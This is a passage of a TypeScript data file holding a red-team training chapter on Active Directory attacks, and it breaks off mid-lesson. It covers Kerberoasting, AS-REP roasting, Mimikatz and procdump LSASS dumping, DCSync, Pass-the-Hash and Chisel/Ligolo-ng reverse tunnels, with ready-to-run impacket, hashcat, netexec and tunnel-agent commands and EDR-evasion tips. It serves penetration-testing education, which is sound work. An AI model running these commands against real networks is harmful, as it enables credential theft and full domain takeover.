import { RoadmapChapter } from "./types";

export const chapter9: RoadmapChapter = {
  id: "ch-9-active-directory",
  chapterNumber: 9,
  title: "Active Directory, Pivoting & Red Team Fundamentals",
  subtitle: "Kerberos Protocol Mechanics, BloodHound Graph Analysis, Kerberoasting, Pass-the-Hash & Pivoting with Chisel",
  badge: "Chapter 9 • Enterprise Red Teaming",
  duration: "20 Hours • 5 In-Depth Lessons",
  difficulty: "Expert",
  description:
    "Over 95% of Fortune 500 enterprises manage identity through Microsoft Active Directory (AD). Master the physics of Kerberos authentication (AS-REQ, TGT, TGS), map attack paths with BloodHound, execute Kerberoasting and AS-REP Roasting to extract service account passwords, harvest LSASS memory with Mimikatz, perform Pass-the-Hash lateral movement, and pivot across multi-tiered corporate networks with Chisel and Ligolo-ng.",
  iconName: "Flag",
  lessons: [
    {
      id: "l-9-1",
      lessonNumber: "9.1",
      title: "Active Directory Architecture: Forests, Domains, Trees & Kerberos Mechanics",
      duration: "4 Hours",
      badge: "AD Fundamentals",
      summary:
        "The architectural foundations of Active Directory Domain Services (AD DS): Domain Controllers (DC), Global Catalogs, LDAP, Trust Relationships, and the step-by-step Kerberos 5 authentication dance.",
      studyNotes: [
        {
          heading: "Active Directory Organizational Hierarchy",
          subheading: "How enterprise identity, permissions, and group policies are unified globally",
          points: [
            "Objects & Organizational Units (OUs): The atomic unit in AD is an Object (User, Computer, Security Group, Shared Folder). OUs are containers used to organize objects and apply Group Policy Objects (GPOs).",
            "Domains, Trees & Forests: A Domain is a security boundary sharing a single directory database (`NTDS.dit`) managed by Domain Controllers (DCs). A Tree is a collection of domains sharing a contiguous DNS namespace (`corp.target.com`, `emea.corp.target.com`). A Forest is the ultimate security boundary containing multiple trees sharing a common Schema and Global Catalog.",
            "Trust Relationships: Two-way transitive trusts allow users in Domain A to access resources in Domain B. Red teams exploit misconfigured domain trusts to escalate from a compromised subsidiary domain into the root enterprise forest.",
            "Domain Controllers (DC) & FSMO Roles: The servers running Active Directory Domain Services, hosting LDAP (port 389/636), Kerberos (port 88), SMB (port 445), and DNS (port 53).",
          ],
          callout: "Compromising the Domain Controller (DC) is the holy grail of corporate red teaming. Once the DC is breached, the attacker controls every workstation, server, user account, email inbox, and executive identity in the entire multinational corporation.",
          diagramOrCode: `+-------------------------------------------------------------+
|               ACTIVE DIRECTORY FOREST HIERARCHY             |
+-------------------------------------------------------------+
 [ ROOT FOREST: corp.target.com ]  <--- Ultimate Trust Boundary
       |
       +---> Domain Controller 1 (DC01.corp.target.com) [NTDS.dit]
       |
       +---> Tree 1: emea.corp.target.com (Two-way Transitive Trust)
       |       └── OU: Executive Laptops
       |       └── OU: Finance Workstations
       |
       +---> Tree 2: apac.corp.target.com
               └── OU: Staging Servers`
        },
        {
          heading: "The Kerberos 5 Authentication Protocol Dance",
          subheading: "Step-by-step cryptographic exchange of tickets and service grants",
          points: [
            "Why Kerberos Replaced NTLM: Kerberos is a ticket-based authentication protocol designed so passwords are never transmitted across the network. It relies on a trusted third party called the Key Distribution Center (KDC), which runs on the Domain Controller.",
            "Step 1: Authentication Service Exchange (AS-REQ / AS-REP): The client encrypts a timestamp using their password hash and sends `AS-REQ` to the KDC. The KDC verifies the timestamp and replies with `AS-REP`, returning the Ticket Granting Ticket (TGT) encrypted with the KDC's secret key (`krbtgt`).",
            "Step 2: Ticket-Granting Service Exchange (TGS-REQ / TGS-REP): When the user wants to access a service (e.g. MSSQL database with Service Principal Name `SPN`), the client presents their TGT to the KDC (`TGS-REQ`). The KDC replies with a Ticket Granting Service (TGS) ticket (`TGS-REP`) encrypted with the SERVICE ACCOUNT'S password hash!",
            "Step 3: Application Exchange (AP-REQ / AP-REP): The client presents the TGS ticket directly to the service server (`AP-REQ`). The service decrypts the ticket using its own password hash and grants access.",
          ],
          callout: "The Kerberoasting vulnerability occurs directly at Step 2! Because ANY authenticated user can request a TGS ticket for any registered Service Principal Name (SPN), and because that ticket is encrypted with the service account's password hash, the user can take that ticket offline and crack the service account password with Hashcat!",
          diagramOrCode: `KERBEROS 5 AUTHENTICATION DANCE:
 [ Client PC ]                [ KDC (Domain Controller) ]        [ MSSQL Server ]
       |                                   |                            |
       | --- 1. AS-REQ (Timestamp) ------> |                            |
       | <--- 2. AS-REP (TGT Ticket) ----- |                            |
       |                                   |                            |
       | --- 3. TGS-REQ (Request SPN) ---> |                            |
       | <--- 4. TGS-REP (TGS Ticket) ---- |                            |
       |                                                                |
       | -------------------- 5. AP-REQ (Present TGS Ticket) ---------> |
       | <------------------- 6. AP-REP (Access Granted!) ------------ |`
        }
      ],
      keyTopics: [
        "Active Directory Organizational Hierarchy (Objects, OUs, Trees, Forests): Active Directory Domain Services (AD DS) manages enterprise identity and resource authorization. Objects (users, computers, groups) are organized into Organizational Units (OUs) that inherit Group Policy Objects (GPOs). A Domain represents a shared security database (NTDS.dit); multiple domains sharing a contiguous namespace form a Tree, and multiple trees sharing a common Schema and Global Catalog form an enterprise Forest.",
        "Domain Controllers, LDAP & The NTDS.dit Database: Domain Controllers (DCs) host the core network daemons powering Active Directory: LDAP/LDAPS (ports 389/636), Kerberos (port 88), DNS (port 53), and SMB (port 445). The entire domain database resides in %SystemRoot%\\NTDS\\NTDS.dit, an extensible storage engine database containing all domain user accounts, group memberships, and NTLM password hashes for every identity in the organization.",
        "Two-Way Transitive & Cross-Forest Trust Relationships: Trust relationships allow users in one domain to access resources in another domain. Two-way transitive trusts automatically extend authentication across all child domains in a forest. Attackers who compromise a low-security subsidiary child domain exploit misconfigured trust attributes (such as SID History filtering disabled) to forge foreign security identifiers and escalate privileges directly into the root parent forest.",
        "The Kerberos 5 Authentication Protocol Flow: Kerberos authentication operates via a ticket-granting service model: 1. The client transmits an AS-REQ (Authentication Service Request) containing a timestamp encrypted with their password hash; 2. The DC verifies the timestamp and returns an AS-REP containing the Ticket Granting Ticket (TGT) encrypted with the secret krbtgt key; 3. The client presents the TGT to request access to a specific service (TGS-REQ); 4. The DC returns a Ticket Granting Service (TGS) ticket encrypted with the target service account's password hash; 5. The client presents the TGS to the service (AP-REQ) to gain access.",
        "The krbtgt Account & Golden Ticket Cryptographic Forgery: The 'krbtgt' account is the master service account in Active Directory whose password hash encrypts all Kerberos Ticket Granting Tickets (TGTs) across the entire domain. If an attacker compromises the Domain Controller and extracts the krbtgt NTLM hash, they can forge a 'Golden Ticket' using Mimikatz. A Golden Ticket allows the attacker to mint arbitrary Kerberos tickets granting Domain Admin rights to any service, persisting indefinitely even if all other passwords are reset.",
      ],
      terminalCommands: [
        "# Enumerate domain controller IP via DNS SRV records:",
        "nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.target.com",
      ],
      proTips: [
        "Look for legacy Kerberos pre-authentication disabled flags (`DONT_REQ_PREAUTH`); these accounts can be attacked immediately via AS-REP Roasting without knowing any passwords!",
        "Active Directory relies 100% on DNS; always set your attack machine's DNS server to the Domain Controller IP to resolve internal domain names.",
      ],
    },
    {
      id: "l-9-2",
      lessonNumber: "9.2",
      title: "Domain Enumeration: BloodHound, SharpHound & PowerView",
      duration: "4 Hours",
      badge: "AD Graph Mapping",
      summary:
        "Mapping hidden Active Directory relationships, Access Control Lists (ACLs), and shortest attack paths to Domain Admin using BloodHound and SharpHound.",
      studyNotes: [
        {
          heading: "Graph Theory in Active Directory Exploitation",
          subheading: "Why attackers think in graphs while defenders think in lists",
          points: [
            "The Complexity Problem: Enterprise Active Directory environments contain tens of thousands of users, computers, groups, GPOs, and Access Control Entries (ACEs). System administrators can never visualize the unintended transitive privilege chains created over 15 years of IT staff turnover.",
            "What is BloodHound? An open-source application that uses graph theory (built on the Neo4j graph database) to visualize Active Directory relationships. It mathematically computes the shortest path from ANY compromised low-privilege user to full Domain Admin.",
            "SharpHound Data Collector: The C# data ingestion agent executed on a compromised domain-joined machine. SharpHound queries LDAP, SMB, and RPC sessions (`SharpHound.exe -c All`) and outputs zip files containing JSON data models of users, groups, local administrator rights, and active sessions.",
            "Common High-Risk Edges: `GenericAll` (complete control over an object), `GenericWrite` (ability to modify object attributes like `scriptPath`), `WriteDacl` (ability to grant oneself full permissions), and `ForceChangePassword` (resetting target user's password without knowing old password).",
          ],
          callout: "The Shortest Path Query: Clicking 'Find Shortest Paths to Domain Admins' in BloodHound reveals multi-step attack chains (e.g. User A -> MemberOf HelpDesk -> GenericAll on User B -> AdminTo Workstation 10 -> Session of Domain Admin -> Credential Dump -> Domain Admin!).",
          diagramOrCode: `+-------------------------------------------------------------+
|               BLOODHOUND ATTACK PATH GRAPH MODEL            |
+-------------------------------------------------------------+
 [ Compromised User: "jdoe" ]
       |
       v (MemberOf)
 [ Security Group: "IT-Interns" ]
       |
       v (GenericAll - Can reset passwords)
 [ Target User: "svc_backup" ]
       |
       v (AdminTo)
 [ Server: "BACKUP-DC-01" ]  <=== Has active logon session of:
       |
       v (Session Stealing via Mimikatz)
 [ Domain Admin: "Administrator" ] ===> FULL ENTERPRISE COMPROMISE!`
        },
        {
          heading: "PowerView: Command-Line Active Directory Enumeration",
          subheading: "Querying Active Directory attributes directly via PowerShell without external tools",
          points: [
            "What is PowerView? Part of the PowerSploit suite, written by Will Schroeder (@harmj0y). It wraps ADSI (Active Directory Service Interfaces) and .NET directory services into intuitive PowerShell cmdlets.",
            "Core Enumeration Cmdlets: `Get-DomainUser` (lists all domain users and description fields), `Get-DomainComputer` (lists all domain computers and OS versions), `Get-DomainGroupMember -Identity \"Domain Admins\"` (lists all enterprise administrators).",
            "Hunting for Passwords in User Descriptions: Administrators frequently paste temporary passwords in the user `description` field: `Get-DomainUser | ? {$_.description -ne $null} | select samaccountname, description`.",
            "Locating High-Value Sessions (`Find-DomainUserLocation`): Scans corporate workstations to identify where Domain Admins are currently logged in, pinpointing the exact host to breach for credential dumping.",
          ],
          callout: "Always check `Get-DomainUser -SPN`. Any user account returned has a registered Service Principal Name and is immediately vulnerable to offline password cracking via Kerberoasting!",
          diagramOrCode: `ESSENTIAL POWERVIEW CMDLETS:
  # Enumerate all Domain Controllers:
  Get-DomainController
  
  # List all users with Kerberoastable SPNs:
  Get-DomainUser -SPN | select samaccountname, serviceprincipalname
  
  # Find computers where current user has Local Administrator rights:
  Find-LocalAdminAccess
  
  # Inspect GPO permissions:
  Get-DomainGPO -ComputerIdentity "PC01.corp.target.com"`
        }
      ],
      keyTopics: [
        "Graph Theory Applications in Active Directory Exploitation: Modern enterprise Active Directory forests contain tens of thousands of users, computers, security groups, GPOs, and Access Control Entries (ACEs). System administrators can never visualize the indirect transitive privilege chains created over years of employee onboarding and department transfers. BloodHound applies graph theory algorithms (built on the Neo4j graph database) to model Active Directory objects as nodes and permissions as directed edges, mathematically computing the shortest attack path to Domain Admin.",
        "SharpHound Telemetry Ingestion & Collection Modes: SharpHound is the official data collection agent for BloodHound, compiled in C#. Executed from a compromised domain workstation, SharpHound queries LDAP directory records, queries the Domain Controller for active SMB user sessions, and inspects local Administrators groups across reachable hosts. SharpHound packages the collected telemetry into compressed JSON files that are imported directly into the BloodHound GUI.",
        "High-Risk Active Directory Access Control List (ACL) Edges: BloodHound identifies dangerous discretionary access control permissions that allow unprivileged users to compromise high-privilege objects. Critical edges include: 'GenericAll' (grants complete control over the target object), 'GenericWrite' (allows modifying object attributes like scriptPath), 'WriteDacl' (allows granting oneself full permissions over the target), and 'ForceChangePassword' (allows resetting a target user's password without knowing their existing password).",
        "PowerView PowerShell Command-Line Directory Enumeration: PowerView (part of the PowerSploit suite) wraps ADSI and .NET directory services into powerful PowerShell cmdlets for interactive domain querying. Key cmdlets include 'Get-DomainUser' (lists user attributes, description notes, and SPNs), 'Get-DomainComputer' (enumerates domain workstations and OS versions), and 'Find-LocalAdminAccess' (scans the network to identify all workstations where the current user possesses Local Administrator rights).",
        "Active Directory Session Hunting & High-Value Target Tracking: Session hunting locates where specific high-value users (such as Domain Admins or executive accounts) are currently logged into the network. Using PowerView's 'Find-DomainUserLocation', researchers query network hosts for active interactive and network logon sessions. Locating a workstation where a Domain Admin is logged in pinpoints the exact physical target host an attacker must compromise to dump credentials from memory.",
      ],
      terminalCommands: [
        "./SharpHound.exe -c All --zipfilename target_ad_data.zip",
        "neo4j console",
        "Get-DomainUser -Identity 'Administrator' | select *",
      ],
      proTips: [
        "In BloodHound, always run the pre-built query 'Find Shortest Paths to High Value Targets' to immediately see the fastest route to enterprise compromise.",
        "Look for accounts with `pwdlastset=0` or user descriptions containing the word 'password'; administrators frequently write initial passwords into AD notes.",
      ],
    },
    {
      id: "l-9-3",
      lessonNumber: "9.3",
      title: "Kerberoasting & AS-REP Roasting Attacks",
      duration: "4 Hours",
      badge: "Kerberos Attacks",
      summary:
        "Extracting and cracking encrypted Kerberos TGS and TGT tickets offline with Rubeus, Impacket, and Hashcat to recover service account passwords without touching the target service.",
      studyNotes: [
        {
          heading: "The Mechanics of Kerberoasting (TGS Ticket Extraction)",
          subheading: "Exploiting the core architectural design of Kerberos service ticket encryption",
          points: [
            "Why Kerberoasting Works: When an Active Directory user requests access to a service (e.g. `MSSQLSvc/db01.corp:1433`), the Domain Controller generates a Kerberos TGS ticket. To ensure only the service can read the ticket, the DC ENCRYPTS IT USING THE SERVICE ACCOUNT'S PASSWORD HASH.",
            "The Attack Flow: 1. Attacker authenticates as ANY low-privilege domain user; 2. Attacker requests a TGS ticket for an account with a Service Principal Name (SPN); 3. The DC delivers the ticket; 4. The attacker extracts the encrypted ticket hash from memory and saves it to a file; 5. The attacker cracks the hash offline using Hashcat (`-m 13100`).",
            "Zero Interaction with Target Service: The attacker never connects to the target database server! The entire transaction occurs purely between the attacker and the Domain Controller, making it invisible to database access logs.",
            "Service Accounts Have High Privileges: Service accounts (like `svc_sql`, `svc_backup`) frequently have local administrator rights on dozens of servers or even Domain Admin privileges, turning a cracked password into instant domain takeover.",
          ],
          callout: "Kerberoasting is not a software bug or vulnerability that can be patched; it is the fundamental design of Kerberos 5! The only effective defense is enforcing 25+ character complex passwords on all service accounts, or migrating to Group Managed Service Accounts (gMSA) whose passwords rotate automatically.",
          diagramOrCode: `+-------------------------------------------------------------+
|               KERBEROASTING ATTACK WORKFLOW                 |
+-------------------------------------------------------------+
 Compromised Low-Privilege User: "intern"
        |
        v Request TGS ticket for service account "svc_sql":
 [ Domain Controller (KDC) ]
        |
        v Generates TGS ticket encrypted with svc_sql's NTLM hash
 Delivers Ticket to intern machine:
   $krb5tgs$23$*svc_sql$CORP.LOCAL*$MSSQLSvc/db01*...
        |
        v (Attacker extracts ticket to hashes.txt)
 Hashcat Offline GPU Cracking:
   hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
        |
        v (Cracked in 2 minutes!)
 Result: svc_sql password is "Summer2025!"`
        },
        {
          heading: "AS-REP Roasting (Zero-Credential Attack)",
          subheading: "Attacking accounts configured with Kerberos pre-authentication disabled",
          points: [
            "What is Kerberos Pre-Authentication? Normally, a user must encrypt a timestamp with their password hash when requesting a TGT (`AS-REQ`). This proves the user knows the password *before* the DC issues any encrypted material.",
            "The Vulnerability (`DONT_REQ_PREAUTH`): If a system administrator checks the box 'Do not require Kerberos preauthentication' on a user account, ANYONE on the network can send an `AS-REQ` for that username.",
            "The Exploit: The DC immediately replies with an `AS-REP` packet encrypted with that user's password hash! The attacker extracts the hash without ever logging in or knowing any password.",
            "Hashcat Mode 18200: Crack AS-REP hashes offline using Hashcat mode `-m 18200` (`$krb5asrep$23$...`).",
          ],
          callout: "You do not need a domain account to execute AS-REP Roasting! If you have network connectivity to the Domain Controller and a list of target usernames, you can request AS-REPs for all of them and crack any that lack pre-authentication.",
          diagramOrCode: `IMPACKET KERBEROASTING & AS-REP ROASTING COMMANDS:
  # Execute Kerberoasting against all SPNs in the domain:
  impacket-GetUserSPNs corp.target.com/john:Password123 -dc-ip 10.10.10.1 -request -outputfile tgs_hashes.txt
  
  # Execute AS-REP Roasting against all users lacking pre-auth:
  impacket-GetNPUsers corp.target.com/ -usersfile users.txt -dc-ip 10.10.10.1 -request -format hashcat -outputfile asrep_hashes.txt
  
  # Crack TGS hashes with Hashcat:
  hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt`
        }
      ],
      keyTopics: [
        "Kerberoasting Attack Mechanics & SPN Targeting: Kerberoasting exploits the fundamental design of the Kerberos 5 protocol to extract and crack service account password hashes offline without touching the target service. Any authenticated domain user can request a Kerberos TGS ticket for any account with a registered Service Principal Name (SPN, such as MSSQLSvc/db.corp.local). Because the DC encrypts this TGS ticket using the service account's password hash, the attacker extracts the ticket from memory and cracks it offline.",
        "Offline GPU Ticket Cracking with Hashcat (-m 13100): Extracted Kerberos TGS tickets are formatted into Hashcat-compatible hash strings ($krb5tgs$23$*service_account*...). Hashcat mode -m 13100 utilizes GPU acceleration to perform high-speed dictionary attacks against the extracted ticket. Because service accounts frequently possess elevated privileges (local administrator rights on database servers or Domain Admin rights) and use weak, non-expiring passwords, cracking the hash grants instant administrative access.",
        "AS-REP Roasting on Pre-Authentication Disabled Accounts: Normally, when a user requests a TGT (AS-REQ), they must encrypt a timestamp with their password hash to prove their identity before the DC issues any encrypted material. If an administrator checks 'Do not require Kerberos preauthentication' on a user account (DONT_REQ_PREAUTH), ANY user can send an AS-REQ for that account, and the DC immediately returns an AS-REP encrypted with that user's password hash. Attackers crack these hashes offline using Hashcat mode -m 18200.",
        "Executing Kerberos Attacks with Impacket & Rubeus: From Linux attack machines, Impacket's 'GetUserSPNs.py' automates querying the Domain Controller for all accounts with SPNs and requesting their TGS tickets in a single command. Impacket's 'GetNPUsers.py' automates querying for accounts with pre-authentication disabled. In Windows environments, Rubeus executes both Kerberoasting and AS-REP Roasting entirely in memory, evading disk-based antivirus inspection.",
        "Defensive Engineering: Group Managed Service Accounts (gMSA): Organizations defend against Kerberoasting by migrating standard user service accounts to Group Managed Service Accounts (gMSA). In a gMSA configuration, Active Directory automatically generates 128-character cryptographically random passwords for the service account and rotates the password automatically every 30 days. Because the password is mathematically impossible to crack offline, Kerberoasting attacks are rendered completely ineffective.",
      ],
      terminalCommands: [
        "impacket-GetUserSPNs corp.target.com/user:pass -dc-ip 10.10.10.1 -request",
        "impacket-GetNPUsers corp.target.com/ -usersfile users.txt -dc-ip 10.10.10.1 -request",
        "hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt",
      ],
      proTips: [
        "In Windows environments, use Rubeus: `Rubeus.exe kerberoast /outfile:hashes.txt` to execute Kerberoasting entirely in memory without spawning external tools.",
        "Check account descriptions before cracking; accounts named `sql_service` or `backup_admin` often have the highest privileges across the domain.",
      ],
    },
    {
      id: "l-9-4",
      lessonNumber: "9.4",
      title: "Pass-the-Hash (PtH), Overpass-the-Hash & Mimikatz Dumping",
      duration: "4 Hours",
      badge: "Lateral Movement",
      summary:
        "Dumping NTLM hashes and Kerberos tickets from LSASS memory using Mimikatz, and executing lateral movement across workstations via Pass-the-Hash (PtH) with CrackMapExec and Impacket.",
      studyNotes: [
        {
          heading: "Dumping Credentials from LSASS Memory with Mimikatz",
          subheading: "Extracting plaintext passwords, NTLM hashes, and Kerberos tickets from Windows RAM",
          points: [
            "What is LSASS? Local Security Authority Subsystem Service (`lsass.exe`). A core Windows process responsible for enforcing security policies, verifying logins, and storing active authentication credentials in memory.",
            "Mimikatz Mastery: Created by Benjamin Delpy (`gentilkiwi`). Mimikatz hooks into the LSASS process using debugging privileges (`privilege::debug`) and extracts plaintext passwords (via WDigest), NTLM password hashes (`sekurlsa::logonpasswords`), and Kerberos tickets (`sekurlsa::tickets`).",
            "DCSync Attack (`lsadump::dcsync`): Once an attacker has rights to replicate directory changes (granted to Domain Admins), they can instruct Mimikatz to simulate being a Domain Controller! The real DC replicates the entire database, handing over the NTLM hash of EVERY user in the domain (including `krbtgt` and `Administrator`) without executing code on the DC!",
            "Evasion & Safety: Windows Defender aggressively blocks Mimikatz. Red teams dump LSASS using native tools (Task Manager -> 'Create dump file' or Sysinternals `procdump.exe`), then exfiltrate `lsass.dmp` and parse it offline on Kali using `pypykatz`.",
          ],
          callout: "The DCSync attack is the ultimate checkmate in Active Directory. You do not need a shell on the Domain Controller. If your account has replication rights, running `impacket-secretsdump` remotely from your Kali machine dumps all 10,000 corporate password hashes across the network.",
          diagramOrCode: `+-------------------------------------------------------------+
|               MIMIKATZ LSASS MEMORY DUMPING WORKFLOW        |
+-------------------------------------------------------------+
 Compromised Windows Workstation (Local Admin Access)
        |
        v
 Run Mimikatz / Procdump on lsass.exe
        |
        v Extract active credentials:
 [ LSASS.EXE PROCESS MEMORY ]
   ├── NTLM Hash: Administrator : aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
   ├── Kerberos Ticket: krbtgt/CORP.LOCAL
   └── WDigest Plaintext: Password2026!
        |
        v
 Attacker uses NTLM hash directly via Pass-the-Hash (No cracking needed!)`
        },
        {
          heading: "Pass-the-Hash (PtH) Lateral Movement",
          subheading: "Authenticating across enterprise workstations using raw NTLM hashes",
          points: [
            "Why Pass-the-Hash Works: The NTLM authentication protocol authenticates users via a challenge-response calculation based on the MD4/NTLM hash of the password, NOT the plaintext password itself. If an attacker possesses the NTLM hash, they can authenticate across SMB (port 445) and WinRM (port 5985) without ever needing to crack the hash!",
            "Lateral Movement with CrackMapExec / NetExec: Scan an entire `/24` subnet using a captured Administrator NTLM hash: `netexec smb 10.10.10.0/24 -u Administrator -H <HASH>`. Look for the glorious `(Pwn3d!)` indicator signaling local administrator rights.",
            "Remote Command Execution via Impacket: Use `impacket-wmiexec` or `impacket-psexec` to spawn an interactive SYSTEM command prompt on target servers using the hash: `impacket-wmiexec Administrator@10.10.10.50 -hashes <NTLM_HASH>`.",
            "Overpass-the-Hash (Pass-the-Key): Converting an NTLM hash into a Kerberos Ticket Granting Ticket (TGT) using Rubeus or Impacket, bridging the gap between NTLM and Kerberos lateral movement.",
          ],
          callout: "Local Administrator Password Reuse: Organizations frequently use the same local administrator password across 5,000 employee laptops. Compromising a single laptop allows an attacker to dump the local admin hash and Pass-the-Hash across every computer in the entire company!",
          diagramOrCode: `LATERAL MOVEMENT CHEATSHEET:
  # Pass-the-Hash across subnet using NetExec:
  nxc smb 10.10.10.0/24 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
  
  # Spawn interactive SYSTEM shell via WMI:
  impacket-wmiexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@10.10.10.20
  
  # Remote DCSync full domain dump:
  impacket-secretsdump -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 corp.local/Administrator@10.10.10.1`
        }
      ],
      keyTopics: [
        "Dumping Credentials from LSASS Memory with Mimikatz: The Local Security Authority Subsystem Service (lsass.exe) is the core Windows process responsible for verifying user logins, enforcing security policies, and storing active authentication credentials. Benjamin Delpy's Mimikatz hooks into LSASS memory using debugging privileges ('privilege::debug') to extract plaintext passwords (via WDigest), NTLM password hashes ('sekurlsa::logonpasswords'), and active Kerberos tickets from memory.",
        "The Remote DCSync Attack (Directory Replication Service): Once an attacker compromises an account possessing Directory Replication rights (granted to Domain Admins and Enterprise Admins), they can execute a DCSync attack using Impacket's 'secretsdump.py'. The attacker's machine simulates being a Domain Controller and requests replication data from the primary DC via the MS-DRSR protocol. The primary DC replicates the entire database, handing over the NTLM hashes of every user in the domain without the attacker executing code on the DC.",
        "Pass-the-Hash (PtH) Lateral Movement Mechanics: NTLM authentication verifies identities using a challenge-response calculation based on the MD4/NTLM hash of the password, never the plaintext password. An attacker who extracts an administrative NTLM hash does not need to crack it; they can use the raw hash directly to authenticate across SMB (port 445), WinRM (port 5985), and RPC services using tools like NetExec or Impacket's wmiexec.py, executing remote commands as SYSTEM.",
        "Overpass-the-Hash (Pass-the-Key) to Kerberos TGTs: Overpass-the-Hash converts an extracted NTLM hash or AES encryption key into a valid Kerberos Ticket Granting Ticket (TGT). Using tools like Rubeus or Impacket, the attacker presents the user's NTLM hash to the Domain Controller in an AS-REQ exchange to request a legitimate Kerberos TGT. This allows attackers to transition seamlessly from NTLM authentication to ticket-based Kerberos lateral movement, evading NTLM-blocking policies.",
        "LSASS Memory Evasion & Procdump Triage: Modern Windows Defender and EDR agents aggressively block Mimikatz from accessing LSASS memory. Attackers evade detection by dumping LSASS using legitimate, digitally signed Microsoft utilities like Sysinternals 'procdump.exe' ('procdump -ma lsass.exe lsass.dmp') or via Task Manager. The resulting crash dump file is exfiltrated to the attacker's Kali machine and parsed offline using 'pypykatz', extracting credentials without triggering on-host alerts.",
      ],
      terminalCommands: [
        "impacket-secretsdump -just-dc-ntlm corp.target.com/admin:pass@10.10.10.1",
        "impacket-wmiexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@10.10.10.50",
        "nxc smb 10.10.10.0/24 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0",
      ],
      proTips: [
        "Use `wmiexec.py` instead of `psexec.py` for lateral movement; `psexec` creates a temporary Windows service that triggers aggressive EDR alerts, while `wmiexec` executes stealthily via WMI.",
        "When dumping LSASS on modern Windows 11 with LSA Protection enabled, use native dump tools (`procdump -ma lsass.exe lsass.dmp`) and parse offline on Kali with `pypykatz`.",
      ],
    },
    {
      id: "l-9-5",
      lessonNumber: "9.5",
      title: "Pivoting & Internal Tunneling: Chisel, Ligolo-ng & SSH",
      duration: "4.5 Hours",
      badge: "Deep Pivoting",
      summary:
        "Traversing multi-tiered network architectures, firewalls, and segmented DMZs using Chisel HTTP tunnels, Ligolo-ng virtual TUN interfaces, and reverse SOCKS proxies.",
      studyNotes: [
        {
          heading: "The Pivoting Dilemma in Enterprise Environments",
          subheading: "How attackers route traffic into isolated internal subnets via compromised dual-homed hosts",
          points: [
            "What is Pivoting? The practice of using a compromised computer (a 'pivot host') as a relay or springboard to route attack traffic into internal subnets that are physically or logically inaccessible to the attacker's machine.",
            "Dual-Homed Pivot Hosts: A DMZ web server typically has two Network Interface Cards (NICs): `eth0` with public IP `198.51.100.20` and `eth1` with internal private IP `10.10.10.5`. An attacker who breaches this server can pivot through it to reach the internal Domain Controller (`10.10.10.1`).",
            "Chisel: High-Speed TCP/UDP Tunnel over HTTP/WebSockets: Written in Go, Chisel creates an encrypted SOCKS5 tunnel encapsulated inside an HTTP/WebSocket stream, easily bypassing egress firewalls that restrict outbound traffic strictly to port 80 or 443.",
            "Reverse SOCKS Tunnel with Chisel: The attacker runs `chisel server --reverse -p 8000` on their VPS. The compromised pivot host connects OUTBOUND to the attacker: `chisel client 10.10.14.5:8000 R:socks`. This creates a local SOCKS5 proxy on `127.0.0.1:1080` on the attacker's machine!",
          ],
          callout: "Why Reverse Tunnels Are Mandatory: In 99% of corporate networks, stateful firewalls block all inbound connections from the Internet to internal hosts. However, they permit outbound HTTP traffic. A reverse tunnel leverages this outbound permission to establish the control channel.",
          diagramOrCode: `+-------------------------------------------------------------+
|               CHISEL REVERSE SOCKS5 PIVOT ARCHITECTURE      |
+-------------------------------------------------------------+
 [ Attacker Kali Machine ]                           [ Compromised Pivot Web Server ]
  Runs Chisel Server on port 8000                     Dual-Homed: 198.51.100.20 / 10.10.10.5
  Opens local SOCKS5 port: 127.0.0.1:1080             Runs Chisel Client connecting outbound
        |                                                   |
        +<================ HTTP/WebSocket Tunnel ===========+
        |                                                   |
 [ Proxychains ]                                            v (Internal Traffic Relayed)
  proxychains nmap -sT 10.10.10.1                     [ Internal Domain Controller ]
  proxychains impacket-wmiexec 10.10.10.1              10.10.10.1:445 (SMB)`
        },
        {
          heading: "Ligolo-ng: True Multi-Subnet TUN Tunneling",
          subheading: "Eliminating Proxychains limitations with native kernel network interfaces",
          points: [
            "The Problem with Proxychains: Proxychains relies on `LD_PRELOAD`, which cannot tunnel raw ICMP ping packets, SYN scans, or tools compiled in Go or statically linked C.",
            "How Ligolo-ng Revolutionizes Pivoting: Ligolo-ng creates a real virtual TUN interface (`ligolo`) on your Kali Linux kernel. It acts like a true hardware VPN! You simply add routing table entries (`ip route add 10.10.10.0/24 dev ligolo`).",
            "Zero Proxychains Overhead: Once the Ligolo TUN route is established, you do NOT type `proxychains`. You run tools directly as if your Kali laptop were physically plugged into the corporate internal switch: `nmap -sS 10.10.10.1` and `ping 10.10.10.1` work flawlessly!",
            "Double Pivoting (Multi-Hop): Relaying traffic through Host A to reach Host B, then pivoting through Host B to reach an isolated air-gapped industrial SCADA network (Subnet C).",
          ],
          callout: "Ligolo-ng has become the undisputed gold standard for OSCP and professional penetration testers. It transforms cumbersome multi-hop SOCKS proxy chains into seamless, kernel-level IP routing tables.",
          diagramOrCode: `LIGOLO-NG CONFIGURATION CHEATSHEET:
  # Step 1: On Kali (Proxy Host):
  sudo ip tuntap add user kali mode tun ligolo
  sudo ip link set ligolo up
  ./proxy -selfcert -laddr 0.0.0.0:11601
  
  # Step 2: On Compromised Target (Agent):
  ./agent -connect 10.10.14.5:11601 -ignore-cert
  
  # Step 3: In Ligolo Proxy session:
  ligolo-ng >> session
  ligolo-ng >> start
  
  # Step 4: Route internal subnet through TUN interface:
  sudo ip route add 10.10.10.0/24 dev ligolo
  
  # Now scan directly without proxychains:
  nmap -sS -Pn 10.10.10.1`
        }
      ],
      keyTopics: [
        "Enterprise Network Segmentation & The Pivoting Dilemma: Enterprise corporate networks enforce zero-trust segmentation between external DMZ enclaves, internal user subnets, and isolated server tiers using internal firewalls. A compromised web server in the DMZ typically possesses two network interfaces: a public interface and an internal interface (e.g. 10.10.10.5). Pivoting uses this compromised dual-homed host as an encrypted relay to route attack traffic into internal subnets that are physically unreachable from the attacker's external machine.",
